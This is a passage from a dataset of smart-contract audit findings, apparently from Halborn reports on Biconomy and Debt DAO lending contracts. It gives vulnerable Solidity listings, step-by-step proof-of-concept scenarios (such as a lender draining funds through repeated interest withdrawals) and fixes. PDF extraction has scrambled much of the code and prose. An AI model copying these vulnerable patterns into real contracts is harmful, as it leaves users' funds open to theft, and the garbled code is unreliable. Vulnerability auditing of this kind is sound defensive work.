82 83 84 85 function changeAdminFee ( uint256 newAdminFee ) public onlyOwner whenNotPaused { require ( newAdminFee != 0 , \" Admin Fee cannot be 0 \" ); adminFee = newAdminFee ; } Listing 16: LiquidityPoolManager.sol 104 function setTrustedForwarder ( address forwarderAddress ) public onlyOwner { 105 106 107 } require ( forwarderAddress != address (0) , \" Forwarder Address cannot be 0 \" ); trustedForwarder = forwarderAddress ; 31 Recommendation: Consider changeAdminFee functions. emitting an event when calling setTrustedForwarder and Listing 17 1 event changeAdminFee ( uint256 newAdminFee ); 2 event setTrustedForwarder ( address forwarderAddress ); defining AdminFeeChanged new events and Remediation Plan: SOLVED: on the TrustedForwarderChanged. Biconomy Team to contract solved notify this users issue such by as 32 ", "labels": ["Halborn", "Biconomy_LiquidityPoolManager", "Severity: Informational"]}, {"title": "LENDER LIQUIDITY LOCKOUT POSSIBLE VIA DEPOSITANDCLOSE FUNCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Debt_DAO_P2P_Loan_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the LineOfCredit contract, the borrower has two possibilities to pay off the debt: by calling depositAndRepay() and then close() functions, or by calling a single depositAndClose() function. The assessment revealed that the depositAndClose() does not transfer funds back to the lender, yet it deletes the debt record (using the internal _close function). As a result, the lenders liquidity is locked in the contract. Listing 1: LineOfCredit.sol (Line 193) 172 function depositAndClose () whileBorrowing 173 onlyBorrower 174 override external 175 176 returns ( bool ) 177 178 179 180 181 { bytes32 id = positionIds [0]; _accrueInterest ( id ); uint256 totalOwed = debts [ id ]. principal + debts [ id ].  interestAccrued ; 182 183 // borrower deposits remaining balance not already repaid and  held in contract 184 185 186 187 188 189 190 191 192 bool success = IERC20 ( debts [ id ]. token ). transferFrom ( msg . sender , address ( this ) , totalOwed ); require ( success , ' Loan : deposit failed '); // clear the debt _repay ( id , totalOwed ); 23 193 194 195 } require ( _close ( id )) ; return true ; Listing 2: LineOfCredit.sol (Line 328) 318 function close ( bytes32 positionId ) override external returns (  bool ) { 319 320 321 322 323 324 325 326 327 328 DebtPosition memory debt = debts [ positionId ]; require ( msg . sender == debt . lender || msg . sender == borrower , \" Loan : msg . sender must be the lender or borrower \" ); // return the lender 's deposit if ( debt . deposit > 0) { require ( IERC20 ( debt . token ). transfer ( debt . lender , debt .  deposit + debt . interestRepaid )) ; 329 330 331 332 333 334 } require ( _close ( positionId )) ; return true ; } Listing 3: LineOfCredit.sol (Line 470) 464 function _close ( bytes32 positionId ) virtual internal returns (  bool ) { 465 466 require ( debts [ positionId ]. principal + debts [ positionId ].  interestAccrued == 0 , 467 468 469 470 471 472 473 474 475 476 ' Loan : close failed . debt owed ' ); delete debts [ positionId ]; // yay gas refunds !!! // remove from active list positionIds = LoanLib . removePosition ( positionIds , positionId ); // brick loan contract if all positions closed if ( positionIds . length == 0) { 24 477 478 479 480 481 482 483 loanStatus = LoanLib . STATUS . REPAID ; } emit CloseDebtPosition ( positionId ); return true ; } Proof of Concept: 1. All necessary contracts are deployed and initialized: RevenueToken, SimpleOracle, LoanLib, LineOfCredit. 2. As borrower and lender add debt position. 3. As borrower, borrow all deposit. 4. As borrower call depositAndClose to pay the debt. 5. Observe that lender did not receive the liquidity. 6. As the lender attempt to call the close function. Observe that it reverts with the error (Loan: msg.sender must be the lender or borrower). 25 Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to return lenders liquidity upon calling the depositAndClose() function. Remediation Plan: SOLVED: The Debt DAO team solved this issue in commit d739f19d646a2d192aae1e8f56f11e90bbc75dac: lenders liquidity now happens on _close() internal function which is called by the depositAndClose() and close() functions. transfer the of 26 ", "labels": ["Halborn", "Debt_DAO_P2P_Loan", "Severity: Critical"]}, {"title": "DEBT PAY OFF IMPOSSIBLE DUE TO INTEGER UNDERFLOW", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Debt_DAO_P2P_Loan_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the LineOfCredit contract, the borrower has two possibilities to pay off the debt: by calling depositAndRepay() and then close() functions, or by calling a single depositAndClose() function. The assessment revealed that both functions depositAndClose() and depositAndRepay() revert due to integer overflow. The error occurs due to principalUsd parameter subtraction done in _repay function. The principalUsd parameter is supposed to have a non-zero value; however, due to condition check in _createCredit where principal parameter is always 0, the principalUsd parameter is not updated. Listing 4: LineOfCredit.sol (Line 197) external virtual override whileActive mutualConsent ( lender , borrower ) returns ( bytes32 ) uint128 drate , uint128 frate , uint256 amount , address token , address lender ) 176 function addCredit ( 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 { lender , address ( this ) , amount bool success = IERC20 ( token ). transferFrom ( ); require ( success , \" Loan : no tokens to lend \"); bytes32 id = _createCredit ( lender , token , amount , 0) ; 27 198 199 200 201 202 require ( interestRate . setRate ( id , drate , frate )) ; return id ; } Listing 5: LineOfCredit.sol (Lines 546-549) 510 511 512 513 514 515 516 function _createCredit ( address lender , address token , uint256 amount , uint256 principal ) internal returns ( bytes32 id ) { id = LoanLib . computePositionId ( address ( this ) , lender ,  token ); 517 518  _close () 519 520 521 522 523 524 525 526 527  ); 528 529 // MUST not double add position . otherwise we can not require ( credits [ id ]. lender == address (0) , \" Loan : position exists \" ); ( bool passed , bytes memory result ) = token . call ( abi . encodeWithSignature (\" decimals () \" ) ); uint8 decimals = ! passed ? 18 : abi . decode ( result , ( uint8 ) uint256 value = LoanLib . getValuation ( oracle , token , amount  , decimals ); 530 531 532 533 534 535 536 537 538 539 540 541 require ( value > 0 , \" Loan : token cannot be valued \"); credits [ id ] = Credit ({ lender : lender , token : token , decimals : decimals , deposit : amount , principal : principal , interestAccrued : 0, interestRepaid : 0 }) ; 28 542 543 544 545 546 547 548 549 550 551 552 ids . push ( id ); // add lender to end of repayment queue emit AddCredit ( lender , token , amount , 0) ; if ( principal > 0) { principalUsd += value ; emit Borrow (id , principal , value ); } return id ; } Listing 6: LineOfCredit.sol (Line 587) 562 563 564 565 566 567 568 569 570 571 function _repay ( bytes32 id , uint256 amount ) internal returns ( bool ) { Credit memory credit = credits [ id ]; int price = oracle . getLatestAnswer ( credit . token ); if ( amount <= credit . interestAccrued ) { credit . interestAccrued -= amount ; uint256 val = LoanLib . calculateValue ( price , amount ,  credit . decimals ); 572 573 574 575 576 577 interestUsd -= val ; credit . interestRepaid += amount ; emit RepayInterest ( id , amount , val ); } else { uint256 principalPayment = amount - credit .  interestAccrued ; 578 579 uint256 iVal = LoanLib . calculateValue ( price , credit .  interestAccrued , credit . decimals ); 580 uint256 pVal = LoanLib . calculateValue ( price ,  principalPayment , credit . decimals ); 581 582 583 584 585 586 587 emit RepayInterest ( id , credit . interestAccrued , iVal ); emit RepayPrincipal ( id , principalPayment , pVal ); // update global credit denominated in usd interestUsd -= iVal ; principalUsd -= pVal ; 29 588 589  token 590 591 592 593 594 // update individual credit position denominated in credit . principal -= principalPayment ; credit . interestRepaid += credit . interestAccrued ; credit . interestAccrued = 0; // if credit fully repaid then remove lender from  repayment queue 595 596 597 598 599 600 601 if ( credit . principal == 0) ids = LoanLib . stepQ ( ids ); } credits [ id ] = credit ; return true ; } Proof of Concept: 1. All necessary contracts are deployed and initialized: RevenueToken, SimpleOracle, LoanLib, LineOfCredit. 2. As the borrower and lender, add credit position, 3. As the borrower, borrow() all deposits. 4. As the borrower, attempt to call depositAndClose to pay the debt. 5. Observe that transaction reverts due to integer overflow. 6. As the borrower, attempt to call depositAndRepay to pay the debt. 7. Observe that transaction reverts due to integer overflow. 30 Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to review and adjust the calculations related to the principalUsd parameter. Remediation Plan: SOLVED: The Debt DAO team solved this issue in commit 51dab65755c9978333b147f99db007a93bd0f81c: the principalUsd parameter and related calculations are now removed. 31 ", "labels": ["Halborn", "Debt_DAO_P2P_Loan", "Severity: Critical"]}, {"title": "LENDER CAN WITHDRAW INTEREST MULTIPLE TIMES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Debt_DAO_P2P_Loan_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the LineOfCredit contract, a lender has the possibility to withdraw accrued interest via withdrawInterest() function. The function does not record the fact of withdrawal; thus, the function can be called multiple times until the contract has a positive token balance. As a result, in the case of multiple lenders recorded in the contract, one lender can extract liquidity from other lenders. Alternatively, a lender can pull unborrowed deposits and force borrowers to pay off higher debt than expected, or force default. Listing 7: LineOfCredit.sol (Line 587) 453 454 455 456 457 458 459 460 461 462 463 464 465 466 467 468 469 470 471 472 473 474 475 476 function withdrawInterest ( bytes32 id ) external override returns ( uint256 ) { require ( msg . sender == credits [ id ]. lender , \" Loan : only lender can withdraw \" ); _accrueInterest ( id ); uint256 amount = credits [ id ]. interestAccrued ; bool success = IERC20 ( credits [ id ]. token ). transfer ( credits [ id ]. lender , amount ); require ( success , \" Loan : withdraw failed \" ); emit WithdrawProfit ( id , amount ); return amount ; } 32 Proof of Concept: As borrower, borrow 10_000_000_000_000_000 tokens from the first Scenario 1 - steal other lenders' liquidity 1. All necessary contracts are deployed and initialized: RevenueToken, SimpleOracle, LoanLib, LineOfCredit. 2. As borrower and lender1, add credit position for 10_000_000_000_000_- 000 tokens and drawn rate set to 3000. This action registers the first credit position. 3. As the borrower and the lender2, add credit position for 10_000_000_- 000_000_000 tokens and drawn rate set to 3000. This action registers the second credit position. 4. position. 5. Forward blockchain time for 20 days. 6. As the lender1, call withdrawInterest for the first credit position ten times. 7. As the borrower, call depositAndClose to pay off the debt and close the first position. 8. As the borrower, attempt to borrow 10_000_000_000_000_000 tokens from the second position. 9. Observe that transaction reverts due to ERC20: transfer amount exceeds balance error. Note that LineOfCredit balance is below 10_000_000_000_- 000_000. 33 Scenario 2 - steal borrower liquidity 1. All necessary contracts are deployed and initialized: RevenueToken, SimpleOracle, LoanLib, LineOfCredit. 2. As borrower and lender1, add credit position for 10_000_000_000_000_- 000 tokens and drawn rate set to 3000. 4. As borrower, borrow 5_000_000_000_000_000 tokens. 5. Forward blockchain time for 20 days. 6. As the lender1, call withdrawInterest ten times. 7. tokens. 8. Observe that transaction reverts due to ERC20: transfer amount exceeds balance error. Note that LineOfCredit balance is below 5_000_000_000_- As the borrower, attempt to borrow 5_000_000_000_000_000 residual 000_000. 9. As the borrower, attempt to call depositAndClose to pay off the debt. Observe that transaction reverts due to ERC20: transfer amount 10. exceeds balance error. 34 Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to limit the withdrawal up to the amount of accrued interest so far and update related storage-parameters to prevent subsequent withdrawals. Remediation Plan: SOLVED: The Debt DAO team solved this issue in commit a18167d41eb4e1ccb70bbeceeef0aff1c93b05f9: function is now removed from contract. the withdrawInterest() 35 ", "labels": ["Halborn", "Debt_DAO_P2P_Loan", "Severity: Critical"]}, {"title": "ORACLE PRICE AFFECTS THE POSSIBILITY OF DEBT REPAYMENT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Debt_DAO_P2P_Loan_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The LineOfCredit contract tracks unpaid interest valuated in USD by This parameter is updated with addition in interestUsd parameter. _accrueInterest() internal function and subtraction in _repay() internal function. The _accrueInterest() is used by accrueInterest(), setRates(), increaseCredit(), borrow(), withdraw(), and withdrawInterest() functions among the others. The _repay() is used by depositAndRepay() and depositAndClose() functions. Listing 8: LineOfCredit.sol (Line 631) 609 610 611 612 613 614 615 616 617 618 619 620 621 622 623 624 625 626 627 628 629 630 631 632 function _accrueInterest ( bytes32 id ) internal returns ( uint256 accruedToken , uint256 accruedValue ) { Credit memory credit = credits [ id ]; // get token demoninated interest accrued accruedToken = interestRate . accrueInterest ( id , credit . principal , credit . deposit ); // update credits balance credit . interestAccrued += accruedToken ; // get USD value of interest accrued accruedValue = LoanLib . getValuation ( oracle , credit . token , accruedToken , credit . decimals ); interestUsd += accruedValue ; 36 633 634 635 636 637 638 } emit InterestAccrued ( id , accruedToken , accruedValue ); credits [ id ] = credit ; // save updates to intterestAccrued return ( accruedToken , accruedValue ); Listing 9: LineOfCredit.sol (Lines 572,586) { internal returns ( bool ) 562 function _repay ( bytes32 id , uint256 amount ) 563 564 565 566 567 568 569 570 571 if ( amount <= credit . interestAccrued ) { Credit memory credit = credits [ id ]; int price = oracle . getLatestAnswer ( credit . token ); credit . interestAccrued -= amount ; uint256 val = LoanLib . calculateValue ( price , amount ,  credit . decimals ); 572 573 574 575 576 577 interestUsd -= val ; credit . interestRepaid += amount ; emit RepayInterest ( id , amount , val ); } else { uint256 principalPayment = amount - credit .  interestAccrued ; 578 579 uint256 iVal = LoanLib . calculateValue ( price , credit .  interestAccrued , credit . decimals ); 580 uint256 pVal = LoanLib . calculateValue ( price ,  principalPayment , credit . decimals ); 581 582 583 584 585 586 587 588 589  token 590 591 emit RepayInterest ( id , credit . interestAccrued , iVal ); emit RepayPrincipal ( id , principalPayment , pVal ); // update global credit denominated in usd interestUsd -= iVal ; principalUsd -= pVal ; // update individual credit position denominated in credit . principal -= principalPayment ; credit . interestRepaid += credit . interestAccrued ; 37 592 593 594 credit . interestAccrued = 0; // if credit fully repaid then remove lender from  repayment queue 595 596 597 598 599 600 601 if ( credit . principal == 0) ids = LoanLib . stepQ ( ids ); } credits [ id ] = credit ; return true ; } The value of interestUsd parameter is strongly affected by the price returned by Oracle. Thus, if the Oracle returns a higher value than previously, an integer underflow occurs in _repay() function, making debt repayment impossible. To exploit this vulnerability, _accrueInterest() must be called prior to _repay() to update interestUsd parameter. Listing 10: LoanLib.sol (Lines 40,55) - Gets total valuation for amount of tokens - Assumes oracles all return answers in USD - Does not check if price < 0. HAndled in - oracle contract specified by loan getting - token to value on oracle - token amount * @param token * @param amount * @param decimals - token decimals * @return */ - total value in usd of all tokens function getValuation ( /* * * @param oracle 36 37 * @notice 38  using given oracle . 39 * @dev  with 1 e8 decimals 40  Oracle or Loan 41  valuation 42 43 44 45 46 47 48 49 50 51 52 53 IOracle oracle , address token , uint256 amount , uint8 decimals external ) 38 returns ( uint256 ) { 54 55 56  , decimals ); } 57 return _calculateValue ( oracle . getLatestAnswer ( token ) , amount Proof of Concept: The codebase uses SimpleOracle mock for testing. Based on this contract, the ChangingOracle was prepared that mimics the price increase after ten days. Listing 11: ChangingOracle.sol (Lines 15,38,49) constructor ( address _supportedToken1 , address _supportedToken2 mapping ( address => int ) prices ; uint256 public immutable creationTime ; 1 pragma solidity 0.8.9; 2 3 import { IOracle } from \" ../ interfaces / IOracle . sol \" ; 4 import { LoanLib } from \" ../ utils / LoanLib . sol \" ; 5 6 contract ChangingOracle is IOracle { 7 8 9 10 11 12  ) { 13 14 15 16 17 18 19 20 21 22 23 24 25 26  int256 ) { function init () external returns ( bool ) { prices [ token ] = newPrice ; return true ; } } } prices [ _supportedToken1 ] = 1000 * 1 e8 ; // 1000 USD prices [ _supportedToken2 ] = 2000 * 1 e8 ; // 2000 USD creationTime = block . timestamp ; function getLatestAnswer ( address token ) external returns ( function changePrice ( address token , int newPrice ) external { 39 // mimic eip4626 // ( bool success , bytes memory result ) = token . call ( abi . // if ( success && result . length > 0) { // // // get the underlying token value ( if ERC4626 ) // NB : Share token to underlying ratio might not be token = abi . decode ( result , ( address ) ); // // } require ( prices [ token ] != 0, \" SimpleOracle : unsupported // simulate price change uint256 difference = block . timestamp - creationTime ; if ( difference > 900000) // 900000 = 10 days and 10 hours return prices [ token ] * 10001 / 10000; 27 28  encodeWithSignature (\" asset () \") ) ; 29 30 31  1:1 32 33 34  token \" ); 35 36 37 38 39 40 41 42 43  ) { 44 45 46 47 48 49 50 } return prices [ token ]; return address (0) ; } } } function healthcheck () external returns ( LoanLib . STATUS status return LoanLib . STATUS . ACTIVE ; function loan () external returns ( address ) { 1. All necessary contracts are deployed and initialized: RevenueToken, ChangingOracle, LoanLib, LineOfCredit. 2. As the borrower and lender1, add credit position for 1_000_000_- 000_000_000 tokens. 3. As the borrower, borrow 1_000_000_000_000_000 tokens. 4. Forward blockchain time for 10 days. 5. Call accrueInterest function. Note that the interestUsd parameter value is updated. 6. Forward blockchain time for 1 day. Note that after 11 days, the ChangingOracle will return higher results. 7. As the borrower, attempt to call depositAndClose. 8. Observe that transaction reverts due to integer overflow. 40 Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to review and adjust the calculations related to the interestUsd parameter. Remediation Plan: SOLVED: The Debt DAO team solved this issue in commit 51dab65755c9978333b147f99db007a93bd0f81c,cbb2f0f2b68b966e95d2d64a2686de33f4c0496b: the interestUsd parameter and related calculations are now removed. 41 ", "labels": ["Halborn", "Debt_DAO_P2P_Loan", "Severity: Critical"]}, {"title": "WITHDRAWING ALL LIQUIDITY BEFORE BORROWING CAN DEADLOCK CONTRACT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Debt_DAO_P2P_Loan_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the LineOfCredit contract, the lender has the possibility to withdraw all unborrowed deposit previously provided for loan through withdraw() function. The assessment revealed that withdrawal of all deposits, before the borrower borrows any amount, can deadlock the contract. The withdraw() function calls _accrueInterest() functions, so a small amount of Eventually, the borrower cant pay off facility interest is accrued. the debt, close the credit, or release the spigots. The whileBorrowing() modifier checks if any principal is borrowed; The however, whileBorrowing() modifier is used both in LineOfCredit and SpigotedLoan contracts in depositAndClose(), depositAndRepay(), claimAndRepay() and claimAndTrade() functions. interest accrued. check does not any if it is Listing 12: LineOfCredit.sol 68 69 70 71 modifier whileBorrowing () { require ( ids . length > 0 && credits [ ids [0]]. principal > 0) ; _ ; } Proof of Concept: 1. All necessary contracts are deployed and initialized: RevenueToken, SimpleOracle, LoanLib, LineOfCredit. 2. As borrower and lender1, add credit position for 1_000_000_000_- 000_000 tokens. 3. As the lender, withdraw() all deposits. 4. As the borrower, attempt to depositAndClose. Observe that the 42 transaction reverted. 5. As the borrower, attempt to close credit. Observe that the transaction reverted with Loan: close failed. credit owed error. 6. As the borrower, attempt to borrow deposit. Observe that the transaction reverted with Loan: no liquidity error. Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to adjust whileBorrowing() modifier to verify if both interestAccrued and principal parameters are above 0. 43 Remediation Plan: SOLVED: The Debt DAO team solved this issue in commit b30347d17a90980aa7ca7c0ffb25067f87039c6d: the _close() internal function now checks only that the principal is not zero before closing. It does not check the interestAccrued parameter. 44 ", "labels": ["Halborn", "Debt_DAO_P2P_Loan", "Severity: Critical"]}, {"title": "SWEEP FUNCTION DOES NOT WORK FOR ARBITER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Debt_DAO_P2P_Loan_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The SpigotedLoan contract implements a fallback mechanism to withdraw all unused funds from spigots in case of the borrower default. The sweep() function can be called to send all unused funds (based on unusedTokens collection) to the arbiter when the loan has defaulted and the status is set to INSOLVENT. However, the INSOLVENT status is never assigned to the loan in the solution, whereas the loan can have LIQUIDATABLE status assigned e.g., in healthcheck() function when the debt deadline has passed. Listing 13: SpigotedLoan.sol (Lines 261,270) 261 * @notice - sends unused tokens to borrower if repaid or  arbiter if liquidatable 262  healthy - doesnt send tokens out if loan is unpaid but 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 * @dev * @param token - token to take out - callable by anyone */ function sweep ( address token ) external returns ( uint256 ) { if ( loanStatus == LoanLib . STATUS . REPAID ) { return _sweep ( borrower , token ); } if ( loanStatus == LoanLib . STATUS . INSOLVENT ) { return _sweep ( arbiter , token ); } return 0; } function _sweep ( address to , address token ) internal returns (  uint256 x ) { 278 279 280 281 282 x = unusedTokens [ token ]; if ( token == address (0) ) { payable ( to ). transfer (x ); } else { require ( IERC20 ( token ). transfer ( to , x )) ; 45 283 284 285 } } delete unusedTokens [ token ]; As a result, all unused revenue and credit tokens stored in SpigotedLoan (unusedTokens collection) are locked in the contract. The credit token can be transferred to the lender using claimAndRepay() function, unless the spigot is still owned by the SpigotedLoan contract, and it is providing new revenue. On the other hand, the revenue token is locked permanently. Proof of Concept: 1. All necessary initialized: are CreditToken, RevenueToken, SimpleOracle, LoanLib, SpigotedLoan, SimpleRevenueContract. Set the ttl parameter to 1 day. contracts deployed and 2. As the borrower and lender1, add credit position for 10_000_000_- 000_000_000 tokens. 3. As the borrower, borrow() half of the deposit - 5_000_000_000_000_- 000. 4. As th borrower and arbiter, add new spigot with addSpigot() function and RevenueContract as input. 5. As the borrower, transfer the ownership of RevenueContract contract to the SpigotController. 6. Mint 500_000_000_000_000 revenue tokens to the RevenueContract contract to simulate token gain. 7. Forward blockchain time for 1 day and 1 second. 8. As the borrower, attempt to borrow() the remaining deposit. Observe that the transaction reverted with Loan: can't borrow error. 7. As the arbiter, call healthcheck() function. Note that the loans status changed from ACTIVE to LIQUIDATABLE. 46 8. As the arbiter, call updateOwnerSplit so 100% of revenue will go to the SpigotController contract. 9. As the arbiter, call claimRevenue() in SpigotController contract to claim revenue tokens. Note that 100% of tokens (500_000_000_000_000) are transferred to the SpigotController. 10. As the arbiter, call claimAndRepay() in SpigotedLoan contract to As trade escrowed revenue tokens and pay off part of the debt. an input, trade exchange data provide 250_000_000_000_000 revenue tokens that should be exchanged for credit tokens. the 11. Observe has revenue tokens. 750,000,000,000,000 Also, SpigotedLoan balances. contract that credit 250,000,000,000,000 250,000,000,000,000 credit tokens and Note and tokens the 47 250,000,000,000,000 revenue tokens are stored in unusedTokens collection. 12. As arbiter, call sweep() function with revenue token address as an input. Note that the function returns a 0 value. 13. As arbiter, call sweep() function with credit token address as an input. Note that the function returns a 0 value. 14. Observe that SpigotedLoan balances remain unchanged. 48 Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended that sweep() function checks loan status against LIQUIDATABLE value instead of INSOLVENT. Remediation Plan: SOLVED: The Debt DAO team solved this issue in commit 2f7f0b44a2d257c92d7626f14f579876c7d00fee: checks loan status against LIQUIDATABLE value. the sweep() function now 49 ", "labels": ["Halborn", "Debt_DAO_P2P_Loan", "Severity: Critical"]}, {"title": "COLLATERAL TOKENS LOCKOUT IN ESCROW", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Debt_DAO_P2P_Loan_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the Escrow contract, the releaseCollateral() function allows the borrower to withdraw collateral with the assumption that the remaining collateral is still above the minimum threshold. When the debt is paid off, the borrower should be allowed to withdraw all remaining collateral. However, the assessment revealed that withdraw of the remaining collateral is not possible. Listing 14: Escrow.sol (Lines 217-220) 203 204 205 206 207 208 209 function releaseCollateral ( uint256 amount , address token , address to ) external returns ( uint256 ) { require ( amount > 0, \" Escrow : amount is 0 \" ); require ( msg . sender == borrower , \" Escrow : only borrower can  call \" ); 210 211 212 213 214 215 216 217 218 219 require ( deposited [ token ]. amount >= amount , \" Escrow : insufficient balance \" ); deposited [ token ]. amount -= amount ; require ( IERC20 ( token ). transfer ( to , amount )); uint256 cratio = _getLatestCollateralRatio () ; require ( cratio >= minimumCollateralRatio , \" Escrow : cannot release collateral if cratio becomes  lower than the minimum \" 220 221 222 223 224 ); emit RemoveCollateral ( token , amount ); return cratio ; } When the last part of the collateral is released, the releaseCollateral 50 Then () function updates the deposited[token].amount with 0 value. the _getLatestCollateralRatio() returns 0 as collateralValue is also 0. Therefore, it is not possible to pass the assertion cratio >= minimumCollateralRatio as it is always false. Listing 15: Escrow.sol (Line 52) /* * 43 44  value vs loan value 45  the latest interest payable 46 47 48  ) { 49 50 51 52 53 54 55 56 } * @notice updates the cratio according to the collateral * @dev calls accrue interest on the loan contract to update * @return the updated collateral ratio in 18 decimals */ function _getLatestCollateralRatio () internal returns ( uint256 ILoan ( loan ). accrueInterest () ; uint256 debtValue = ILoan ( loan ). getOutstandingDebt () ; uint256 collateralValue = _getCollateralValue () ; if ( collateralValue == 0) return 0; if ( debtValue == 0) return MAX_INT ; return _percent ( collateralValue , debtValue , 18) ; Proof of Concept: 1. All necessary contracts are deployed and initialized: CreditToken, RevenueToken, SimpleOracle, LoanLib, EscrowedLoan. 2. As arbiter, enable the RevenueToken token as collateral. 3. As the borrower, add 200_000_000_000_000 of RevenueToken tokens as collateral. 4. As borrower and lender, add debt position. 5. As the borrower, borrow all deposits. 6. As the borrower, attempt to call releaseCollateral() to withdraw all remaining collateral. Observe that the transaction reverts with Escrow: cannot release collateral if cratio becomes lower than the minimum error. tokens are locked in the Escrow contract. Note that 200_000_000_000_000 of RevenueToken 51 Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to fix the implementation of releaseCollateral() and _getLatestCollateralRatio() functions to allow the borrower to withdraw of the remaining collateral. 52 Remediation Plan: SOLVED: The Debt DAO team solved this issue in commit e97e8be0c7ecf8710a996b8f202bbd3a6bee0e2c: function now checks the loan status against REPAID value. the releaseCollateral() 53 ", "labels": ["Halborn", "Debt_DAO_P2P_Loan", "Severity: Critical"]}, {"title": "GETOUTSTANDINGDEBT FUNCTION RETURNS UNDERSTATED VALUE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Debt_DAO_P2P_Loan_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the LineOfCredit contract, the getOutstandingDebt() function allows users to get information about total outstanding debt valuated in USD. The presented amount is a sum of principal and interest. The assessment revealed that the getOutstandingDebt() function does not consider the Thus, it presents accrued interest from the last evaluation period. misleading, understated value to the users as actual debt is higher. Listing 16: LineOfCredit.sol * @notice - Returns total credit obligation of borrower . Aggregated across all lenders . Denominated in USD 1 e8 . - callable by anyone 112 /* * 113 114 115 116 117 118 * @dev */ function getOutstandingDebt () external override returns (  uint256 ) { 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 ( uint256 p , uint256 i ) = _updateOutstandingCredit () ; return p + i ; } function _updateOutstandingCredit () internal returns ( uint256 principal , uint256 interest ) { uint256 len = ids . length ; if ( len == 0) return (0 , 0) ; Credit memory credit ; for ( uint256 i = 0; i < len ; i ++) { credit = credits [ ids [i ]]; int256 price = oracle . getLatestAnswer ( credit . token ); 54 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 principal += LoanLib . calculateValue ( price , credit . principal , credit . decimals ); interest += LoanLib . calculateValue ( price , credit . interestAccrued , credit . decimals ); } principalUsd = principal ; interestUsd = interest ; } Proof of Concept: 1. All necessary contracts are deployed and initialized: RevenueToken, SimpleOracle, LoanLib, LineOfCredit. 2. As borrower and lender1, add credit position for 10_000_000_000_- 000_000 tokens. 3. As the borrower, borrow 500_000_000_000_000 tokens. 4. Forward blockchain time for 10 days. 5. Call getOutstandingDebt() function. Observe that returned value of 100000000 does not include accrued interest. 6. Call accrueInterest() function. Observe that returned value of 27652. 7. As borrower, borrow 500_000_000_000_000 tokens. 8. Forward blockchain time for 10 days. 9. Call the getOutstandingDebt() function. Observe that returned value of 200027652. Note that this value includes the accrued interest from step 6. 10. Call the accrueInterest() function. Observe that returned value of 54757. Note that this value includes the accrued interest only from the last 10 days and was not included in step 9. 55 Risk Level: Likelihood - 5 Impact - 3 56 Recommendation: It is recommended that the getOutstandingDebt() function returns a value that includes the total accrued interest. Remediation Plan: SOLVED: The Debt DAO team solved this issue in commit c571e48d52f886b2d4c9f930a6bb27cf331501ae: function is now removed. added and includes both updated principal and accrued interest. getOutstandingDebt() The updateOutstandingDebt() function is now the 57 ", "labels": ["Halborn", "Debt_DAO_P2P_Loan", "Severity: High"]}, {"title": "BORROWING FROM NON", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Debt_DAO_P2P_Loan_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the LineOfCredit contract, a borrower can add multiple credits with The borrower can borrow any amount from any credit various lenders. position using the borrow(bytes32 id, uint256 amount) function. However, the borrower can only repay first credit position using depositAndRepay() or depositAndClose() functions. Listing 17: LineOfCredit.sol (Lines 309,342) 302 /* * 303 * @notice - Transfers enough tokens to repay entire credit  position from ` borrower ` to Loan contract . 304 305 306 307 308 309 310 311 312 313 314 315 316 * @dev - callable by borrower */ function depositAndClose () external override whileBorrowing onlyBorrower returns ( bool ) { bytes32 id = ids [0]; _accrueInterest ( id ); uint256 totalOwed = credits [ id ]. principal + credits [ id ].  interestAccrued ; 317 318 // borrower deposits remaining balance not already repaid  and held in contract 319 320 321 322 323 324 bool success = IERC20 ( credits [ id ]. token ). transferFrom ( msg . sender , address ( this ) , totalOwed ); require ( success , \" Loan : deposit failed \"); 58 325 326 327 328 329 330 331 332 333 // clear the credit _repay ( id , totalOwed ); require ( _close ( id )) ; return true ; } /* * * @dev - Transfers token used in credit position from msg .  sender to Loan contract . 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 * @dev - callable by anyone * @notice - see _repay () for more details * @param amount - amount of ` token ` in `id ` to pay back */ function depositAndRepay ( uint256 amount ) external override whileBorrowing returns ( bool ) { bytes32 id = ids [0]; _accrueInterest ( id ); require ( amount <= credits [ id ]. principal + credits [ id ].  interestAccrued ); 349 350 351 352 353 354 355 356 357 358 359 bool success = IERC20 ( credits [ id ]. token ). transferFrom ( msg . sender , address ( this ) , amount ); require ( success , \" Loan : failed repayment \" ); _repay ( id , amount ); return true ; } When the borrower borrow() deposit from the second position, repaying the debt will not be possible, as the whileBorrowing() modifier would block that operation. At this point, the close(bytes32 id) function can be called to close the first credit position unless the _accrueInterest () internal function is called and interest is accrued, preventing the 59 closing of the unpaid debt. Listing 18: LineOfCredit.sol 68 69 70 71 modifier 